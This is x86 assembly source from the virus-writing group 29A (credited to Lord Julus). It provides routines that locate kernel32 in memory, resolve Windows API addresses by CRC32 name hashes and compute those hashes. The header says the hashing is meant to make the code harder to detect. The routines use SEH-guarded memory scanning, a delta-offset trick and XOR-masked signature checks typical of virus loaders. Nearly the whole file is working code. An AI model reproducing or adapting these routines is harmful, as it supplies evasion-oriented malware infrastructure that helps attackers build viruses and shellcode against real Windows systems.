   ; Locating modules and their exported api addresses routines
   ;
   ; Deluxe V2.0 ;-)
   ;
   ; (C) Lord Julus / [29A]
   ;
   ; This includes the jp/lapse/vecna crc32 macro calculator and the api
   ; getter is modified to search for the crc32 instead of names. Saves space
   ; and makes it harder to detect.

   ;ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ
   ;Û Locate Kernel32 base address                                           Û
   ;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ
   ;
   ; Entry:  EAX = dword on stack at startup
   ;         EDX = pointer to kernel32 name
   ;
   ; Return: EAX = base address of kernel32 if success
   ;         EAX = 0, CF set if fail

   LocateKernel32 proc near
          pushad                                      ; save all registers
          call @800                                   ; ...I don't know why I
   @800:  pop ebx                                     ; had to do this this way,
          add ebx, delta3-@800+1                      ; but it wouldn't work
          mov dword ptr [ebx], ebp                    ; otherwise...
                                                      ;
          lea ebx, [ebp+try_method_2_error]           ; first set up a seh
          push ebx                                    ; frame so that if our
          push dword ptr fs:[0]                       ; first method crashes
          mov fs:[0], esp                             ; we will find ourselves
                                                      ; in the second method
   locateloop:                                        ;
          cmp dword ptr [eax+0b4h], eax               ; first method looks for
          je found_k32_kill_seh                       ; the k32 by checking for
          dec eax                                     ; the equal dword at 0b4
          cmp eax, 40000000h                          ;
          jbe try_method_2                            ;
          jmp locateloop                              ;
                                                      ;
   found_k32_kill_seh:                                ; if we found it, then we
          pop dword ptr fs:[0]                        ; must destroy the temp
          add esp, 4                                  ; seh frame
          mov [esp.pop_eax], eax                      ;
          jmp found_k32                               ;
                                                      ;
   try_method_2_error:                                ; if the first method gave
           mov esp, [esp+8]                           ; and exception error we
   delta3: mov ebp, 12345678h                         ; restore the stack and
                                                      ; the delta handle
   try_method_2:                                      ;
          pop dword ptr fs:[0]                        ; restore the seh state
          add esp, 4                                  ;
          popad                                       ; restore registers and
          pushad                                      ; save them again
                                                      ; and go on w/ method two
          lea esi, [ebp+offset getmodulehandle]       ;
          mov ecx, getmodulehandlelen                 ;
          call not_list                               ;
                                                      ;
          mov ebx, dword ptr [ebp+imagebase]          ; now put imagebase in ebx
          mov esi, ebx                                ;
          cmp word ptr [esi], 'ZM'                    ; check if it is an EXE
          jne notfound_k32                            ;
          mov esi, dword ptr [esi.MZ_lfanew]          ; get pointer to PE
          cmp esi, 1000h                              ; too far away?
          jae notfound_k32                            ;
          add esi, ebx                                ;
          cmp word ptr [esi], 'EP'                    ; is it a PE?
          jne notfound_k32                            ;
          add esi, IMAGE_FILE_HEADER_SIZE             ; skip header
          mov edi, dword ptr [esi.OH_DataDirectory.DE_Import.DD_VirtualAddress]
          add edi, ebx                                ; and get import RVA
          mov ecx, dword ptr [esi.OH_DataDirectory.DE_Import.DD_Size]
          add ecx, edi                                ; and import size
          mov eax, edi                                ; save RVA
                                                      ;
   locateloop2:                                       ;
          mov edi, dword ptr [edi.ID_Name]            ; get the name
          add edi, ebx                                ;
          xor dword ptr [edi], 'ö'                 ;
          cmp dword ptr [edi], 'NREK' xor 'ö'      ; and compare to KERN
          xor dword ptr [edi], 'ö'                 ;
          je found_the_kernel_import                  ; if it is not that one
          add eax, IMAGE_IMPORT_DESCRIPTOR_SIZE       ; skip to the next desc.
          mov edi, eax                                ;
          cmp edi, ecx                                ; but not beyond the size
          jae notfound_k32                            ; of the descriptor
          jmp locateloop2                             ;
                                                      ;
   found_the_kernel_import:                           ; if we found the kernel
          mov edi, eax                                ; import descriptor
          mov esi, dword ptr [edi.ID_FirstThunk]      ; take the pointer to
          add esi, ebx                                ; addresses
          mov edi, dword ptr [edi.ID_Characteristics] ; and the pointer to
          add edi, ebx                                ; names
                                                      ;
   gha_locate_loop:                                   ;
          push edi                                    ; save pointer to names
          mov edi, dword ptr [edi.TD_AddressOfData]   ; go to the actual thunk
          add edi, ebx                                ;
          add edi, 2                                  ; and skip the hint
                                                      ;
          push edi esi                                ; save these
          lea esi, dword ptr [ebp+getmodulehandle]    ; and point the name of
          mov ecx, getmodulehandlelen                 ; GetModuleHandleA
          rep cmpsb                                   ; see if it is that one
          je found_getmodulehandle                    ; if so...
          pop esi edi                                 ; otherwise restore
                                                      ;
          pop edi                                     ; restore arrays indexes
          add edi, 4                                  ; and skip to next
          add esi, 4                                  ;
          cmp dword ptr [esi], 0                      ; 0? -> end of import
          je notfound_k32                             ;
          jmp gha_locate_loop                         ;
                                                      ;
   found_getmodulehandle:                             ;
          pop esi                                     ; restore stack
          pop edi                                     ;
          pop edi                                     ;
                                                      ;
          lea esi, [ebp+offset getmodulehandle]       ;
          mov ecx, getmodulehandlelen                 ;
          call not_list                               ;
                                                      ;
          push edx                                    ; push kernel32 name
          mov esi, [esi]                              ; esi = GetModuleHandleA
          call esi                                    ; address...
          mov [esp.pop_eax], eax                      ;
          or eax, eax                                 ;
          jz notfound_k32                             ;
                                                      ;
   found_k32:                                         ;
          popad                                       ; restore all regs and
          clc                                         ; and mark success
          ret                                         ;
                                                      ;
   notfound_k32:                                      ;
          popad                                       ; restore all regs
          xor eax, eax                                ; and mark the failure...
          stc                                         ;
          ret                                         ;
   LocateKernel32 endp                                ;
   @900 dd 0

   ;ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ
   ;Û Locate Apis                                                            Û
   ;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ
   ;
   ; Entry:  EAX = base of module
   ;         ESI = pointer to API name crc32 array
   ;         EDX = pointer to array to receive API addresses
   ;         ECX = how many apis to import
   ;
   ; Return: EAX = 0, CF set if fail

   LocateApis proc near                               ;
          pushad                                      ;
          mov [ebp+@901], ecx                         ;
                                                      ;
          push esi                                    ;
          push edx                                    ;
          mov ebx, eax                                ; save the module base
          mov edi, eax                                ;
          mov ax, word ptr [edi]                      ;
          xor ax, ' '                                ;
          cmp ax, 'ZM' xor ' '                       ; is it an exe?
          jne novalidmodule                           ;
                                                      ;
          mov edi, dword ptr [edi.MZ_lfanew]          ;
          cmp edi, 1000h                              ;
          jae novalidmodule                           ;
                                                      ;
          add edi, ebx                                ;
          mov ax, word ptr [edi]                      ;
          xor ax, 'ñ'                                ;
          cmp ax, 'EP' xor 'ñ'                       ; is it a PE?
          jne novalidmodule                           ;
                                                      ;
          add edi, IMAGE_FILE_HEADER_SIZE             ; skip file header
                                                      ;
          mov edi, dword ptr [edi.OH_DataDirectory.DE_Export.DD_VirtualAddress]
          add edi, ebx                                ; and get export RVA
                                                      ;
          mov ecx, dword ptr [edi.ED_NumberOfNames]   ; save number of names
                                                      ; to look into
          mov esi, dword ptr [edi.ED_AddressOfNames]  ; get address of names
          add esi, ebx                                ; align to base rva
          mov [ebp+@903], edi                         ;
                                                      ;
          pop edx                                     ;
          pop edi                                     ;
                                                      ;
   api_locate_loop:                                   ;
          push ecx esi                                ; save counter and addr.
                                                      ;
          push edi                                    ;
          mov edi, [esi]                              ; get one name address
          add edi, ebx                                ; and align it
                                                      ;
          mov esi, edi                                ;
          call StringCRC32                            ;
                                                      ;
          pop edi                                     ;
          push edi                                    ;
          xor ecx, ecx                                ;
                                                      ;
   rep_cmp:                                           ;
         cmp dword ptr [edi], 0                       ;
         je continue_search                           ;
         cmp [edi], eax                               ;
         je apifound                                  ;
         inc ecx                                      ;
         add edi, 4                                   ;
         jmp rep_cmp                                  ;
                                                      ;
   continue_search:                                   ;
          pop edi esi ecx                             ; restore them
                                                      ;
          add esi, 4                                  ; and get next name
          loop api_locate_loop                        ;
                                                      ;
   novalidmodule:                                     ; we didn't find it...
          popad                                       ;
          xor eax, eax                                ; mark failure
          stc                                         ;
          ret                                         ;
                                                      ;
   apifound:                                          ;
          mov [ebp+@904], ecx                         ;
          pop edi esi ecx                             ; ecx = how many did we
          push ecx esi                                ;
          push edi                                    ;
          mov edi, [ebp+@903]                         ;
          sub ecx, dword ptr [edi.ED_NumberOfNames]   ; we need the reminder
          neg ecx                                     ; of the search
          mov eax, dword ptr [edi.ED_AddressOfOrdinals]; get address of ordinals
          add eax, ebx                                ;
          shl ecx, 1                                  ; and look using the index
          add eax, ecx                                ;
          xor ecx, ecx                                ;
          mov cx, word ptr [eax]                      ; take the ordinal
          mov eax, dword ptr [edi.ED_AddressOfFunctions]; take address of funcs.
          add eax, ebx                                ;
          shl ecx, 2                                  ; we look in a dword array
          add eax, ecx                                ; go to the function addr
          mov eax, [eax]                              ; take it's address
          add eax, ebx                                ; and align it to base
          mov ecx, [ebp+@904]                         ;
          shl ecx, 2                                  ;
          mov [edx+ecx], eax                          ;
          dec [ebp+@901]                              ;
          cmp [ebp+@901], 0                           ;
          je all_done                                 ;
          jmp continue_search                         ;
                                                      ;
   all_done:                                          ;
          add esp, 0Ch                                ;
          popad                                       ;
          clc                                         ;
          ret                                         ;
   LocateApis endp                                    ;
   @901 dd 0                                          ;
   @903 dd 0                                          ;
   @904 dd 0

   ;ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ
   ;Û General module handle retriving routine                                Û
   ;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ
   ;
   ; Entry:  EDI = pointer to module name
   ;
   ; Return: EAX = module base address if success
   ;         EAX = 0, CF set if fail

   LocateModuleBase proc near                         ;
          pushad                                      ; save regs
          push edi                                    ; push name
          call dword ptr [ebp+_LoadLibraryA]          ; call LoadLibraryA
          mov [esp.pop_eax], eax                      ;
          popad                                       ;
          or eax, eax                                 ;
          jz notfoundmodule                           ;
          clc                                         ; success
          ret                                         ;
                                                      ;
   notfoundmodule:                                    ;
          stc                                         ; fail
          ret                                         ;
   LocateModuleBase endp                              ;

   ;ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ
   ;Û CRC32 computer for strings                                             Û
   ;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ

   StringCRC32 proc near
   ; Input :   ESI = address of 0 terminated string to calculate CRC32 for
   ; Output:   EAX = CRC32
   ; From Prizzy's Crypto the idea of a string dedicated CRC32er

          push edx                                    ;
          mov edx, mCRC32_init                        ;
                                                      ;
   CRC32_next_byte:                                   ;
          lodsb                                       ;
          or al, al                                   ;
          jz CRC32_finish                             ;
          xor dl, al                                  ;
          mov al, 08h                                 ;
                                                      ;
   CRC32_next_bit:                                    ;
          shr edx, 01h                                ;
          jnc CRC32_no_change                         ;
          xor edx, mCRC32                             ;
                                                      ;
   CRC32_no_change:                                   ;
          dec al                                      ;
          jnz CRC32_next_bit                          ;
          jmp CRC32_next_byte                         ;
                                                      ;
   CRC32_finish:                                      ;
          xchg eax, edx                               ;
          pop edx                                     ;
          ret                                         ;
   StringCRC32 endp                                   ;
